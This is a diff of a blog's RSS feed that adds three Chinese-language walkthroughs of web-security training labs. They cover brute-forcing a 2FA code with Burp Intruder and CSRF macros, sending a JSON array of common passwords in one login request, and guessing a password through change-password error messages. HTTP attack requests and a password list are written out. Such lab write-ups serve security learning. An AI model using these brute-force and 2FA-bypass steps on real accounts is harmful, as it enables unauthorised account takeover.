@@ -1,4 +1,206 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Terminal</title><link>/posts/</link><description>Recent content in Posts on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Thu, 05 Dec 2024 22:05:14 +0800</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>在Macos上安装CodeQL并集成VSCode插件</title><link>/posts/installing-codeql-on-macos/</link><pubDate>Thu, 05 Dec 2024 22:05:14 +0800</pubDate><guid>/posts/installing-codeql-on-macos/</guid><description>&lt;ol>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Terminal</title><link>/posts/</link><description>Recent content in Posts on Terminal</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 07 Dec 2024 17:47:40 +0800</lastBuildDate><atom:link href="/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>[Write Up]Lab: 2FA bypass using a brute-force attack</title><link>/posts/authentication-lab-2fa-bypass-using-a-brute-force-attack/</link><pubDate>Sat, 07 Dec 2024 17:47:40 +0800</pubDate><guid>/posts/authentication-lab-2fa-bypass-using-a-brute-force-attack/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
+&lt;li>使用&lt;code>carlos:montoya&lt;/code>登录后，来到输入&lt;code>security code&lt;/code>页面，且输入错误2次后，会跳转回到登入页面；输入&lt;code>security code&lt;/code>对应Request如下&lt;/li>
+&lt;/ol>
+&lt;pre tabindex="0">&lt;code class="language-htttp" data-lang="htttp">POST /login2 HTTP/2
+csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=1111
+&lt;/code>&lt;/pre>&lt;ol start="3">
+&lt;li>在进行爆破时，需要同时获取&lt;code>csrf&lt;/code>与&lt;code>mfa-code&lt;/code>参数&lt;/li>
+&lt;li>&lt;code>csrf&lt;/code>需要通过登录操作从服务器端获取，题目建议使用Burp macros自动化获得&lt;code>csrf&lt;/code>
+&lt;ol>
+&lt;li>点击右上角&lt;code>Settings&lt;/code>进行页面，选择左侧&lt;code>Sessions&lt;/code>，再点击中间&lt;code>Session handling rules -&amp;gt; Add&lt;/code>&lt;/li>
+&lt;li>在&lt;code>Rule actions&lt;/code>点击&lt;code>Add&lt;/code>，并选择&lt;code>Run a macro&lt;/code>
+&lt;img alt="Run a macro" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-2.jpg">&lt;/li>
+&lt;li>点击&lt;code>Add&lt;/code>
+&lt;img alt="Add" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-3.jpg">&lt;/li>
+&lt;li>使用&lt;code>HTTP history filter&lt;/code>过滤此次Lab的相关url
+&lt;img alt="HTTP history filter" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-4.jpg">&lt;/li>
+&lt;li>选择产生&lt;code>csrf&lt;/code>参数的3个相关HTTP
+&lt;img alt="Macro Editor" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-5.jpg">&lt;/li>
+&lt;li>点击&lt;code>OK&lt;/code>后回到主设定页面
+&lt;img alt="Macro Editor" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-6.jpg">&lt;/li>
+&lt;li>点击&lt;code>Scope&lt;/code>，并在&lt;code>URL scope&lt;/code>中选择&lt;code>Include all URLs&lt;/code>
+&lt;img alt="URL scope" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-7.jpg">&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>将验证&lt;code>security code&lt;/code>HTTP发送至Burp Intruder&lt;/li>
+&lt;li>使用Sniper attack模式，请求参数设定如下&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login2 &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=§1111§
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="7">
+&lt;li>参数1设定如下
+&lt;img alt="Param 1" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-8.jpg">&lt;/li>
+&lt;li>选择&lt;code>Resource poll&lt;/code>，并点击&lt;code>Create new resource pool&lt;/code>
+&lt;img alt="Resource poll" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-9.jpg">&lt;/li>
+&lt;li>点击&lt;code>Start attack&lt;/code>开始进行爆破，先查看前几个Response，内容应该包含&lt;code>Incorrect security code&lt;/code>，才表示&lt;code>csrf&lt;/code>的相关设定正确且生效&lt;/li>
+&lt;li>通过&lt;code>Intruder attack results filter&lt;/code>过滤结果
+&lt;img alt="Filter" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-10.jpg">&lt;/li>
+&lt;li>根据爆破结果，将&lt;code>Set-Cookie&lt;/code>中的&lt;code>session&lt;/code>变量粘贴至浏览器的&lt;code>Cookie&lt;/code>
+&lt;img alt="Cookie" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-11.jpg">
+&lt;img alt="Cookie" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-12.jpg">&lt;/li>
+&lt;li>刷新页面后即可解题
+&lt;img alt="Solved" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-13.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Broken brute-force protection, multiple credentials per request</title><link>/posts/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request/</link><pubDate>Sat, 07 Dec 2024 17:22:28 +0800</pubDate><guid>/posts/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
+&lt;li>通过页面进行错误登录尝试，Response如下&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;username&amp;#34;:&amp;#34;carlos&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;1&amp;#34;}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;li>将Request发送至Burp Repeater，并将&lt;code>password&lt;/code>参数替换为&lt;code>JSON array&lt;/code>格式，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;username&amp;#34;:&amp;#34;carlos&amp;#34;,&amp;#34;password&amp;#34;:[
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;123456&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;password&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;12345678&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;qwerty&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;123456789&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;12345&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;1234&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;111111&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;1234567&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;dragon&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;123123&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;baseball&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;abc123&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;football&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;monkey&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;letmein&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;shadow&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;master&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;666666&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;qwertyuiop&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;123321&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;mustang&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;1234567890&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;michael&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;654321&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;superman&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;1qaz2wsx&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;7777777&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;121212&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;000000&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;qazwsx&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;123qwe&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;killer&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;trustno1&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;jordan&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;jennifer&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;zxcvbnm&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;asdfgh&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;hunter&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;buster&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;soccer&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;harley&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;batman&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;andrew&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;tigger&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;sunshine&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;iloveyou&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;2000&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;charlie&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;robert&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;thomas&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;hockey&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;ranger&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;daniel&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;starwars&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;klaster&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;112233&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;george&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;computer&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;michelle&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;jessica&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;pepper&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;1111&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;zxcvbn&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;555555&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;11111111&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;131313&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;freedom&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;777777&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;pass&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;maggie&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;159753&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;aaaaaa&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;ginger&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;princess&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;joshua&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;cheese&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;amanda&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;summer&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;love&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;ashley&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;nicole&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;chelsea&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;biteme&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;matthew&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;access&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;yankees&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;987654321&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;dallas&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;austin&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;thunder&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;taylor&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;matrix&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;mobilemail&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;mom&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;monitor&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;monitoring&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;montana&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;moon&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;#34;moscow&amp;#34;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/my-account?id=carlos&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;li>将请求发送回浏览器即可解题&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Password brute-force via password change</title><link>/posts/authentication-lab-password-brute-force-via-password-change/</link><pubDate>Sat, 07 Dec 2024 15:04:32 +0800</pubDate><guid>/posts/authentication-lab-password-brute-force-via-password-change/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-password-brute-force-via-password-change-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-password-brute-force-via-password-change-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
+&lt;li>登录成功后，看到此&lt;code>Change password&lt;/code>按钮
+&lt;img alt="Change password" src="/img/authentication-lab-password-brute-force-via-password-change-2.jpg">&lt;/li>
+&lt;li>根据不同参数条件，获得以下三种不同情况的Response
+&lt;ol>
+&lt;li>&lt;code>Current password&lt;/code>错误，但&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>相同&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/login&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Frame-Options&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">SAMEORIGIN&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
+&lt;li>&lt;code>Current password&lt;/code>错误，且&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>不同，返回内容包含&lt;code>Current password is incorrect&lt;/code>关键字
+&lt;img alt="Change password" src="/img/authentication-lab-password-brute-force-via-password-change-3.jpg">&lt;/li>
+&lt;li>&lt;code>Current password&lt;/code>正确，但&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>不同，返回内容包含&lt;code>New passwords do not match&lt;/code>关键字
+&lt;img alt="Change password" src="/img/authentication-lab-password-brute-force-via-password-change-4.jpg">&lt;/li>
+&lt;/ol>
+&lt;/li>
+&lt;li>结合上述2、3的情况(&lt;code>Current password&lt;/code>错误/正确、&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>不同)，进行密码爆破，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表&lt;/li>
+&lt;/ol>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /my-account/change-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=carlos&amp;amp;current-password=§password§&amp;amp;new-password-1=1&amp;amp;new-password-2=12
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;li>在结果中搜索&lt;code>New passwords do not match&lt;/code>关键字，获得密码为&lt;code>abc123&lt;/code>
+&lt;img alt="Change password" src="/img/authentication-lab-password-brute-force-via-password-change-5.jpg">&lt;/li>
+&lt;li>使用&lt;code>carlos:abc123&lt;/code>登录即可解题&lt;/li>
+&lt;/ol></content></item><item><title>在Macos上安装CodeQL并集成VSCode插件</title><link>/posts/installing-codeql-on-macos/</link><pubDate>Thu, 05 Dec 2024 22:05:14 +0800</pubDate><guid>/posts/installing-codeql-on-macos/</guid><description>&lt;ol>
 &lt;li>至&lt;a href="https://github.com/github/codeql-action/releases">codeql-action releases&lt;/a>下载最新版本的&lt;code>codeql-bundle-osx64.tar.gz&lt;/code>&lt;/li>
 &lt;li>解压缩到任一目录，执行以下命令确认可执行&lt;/li>
 &lt;/ol>
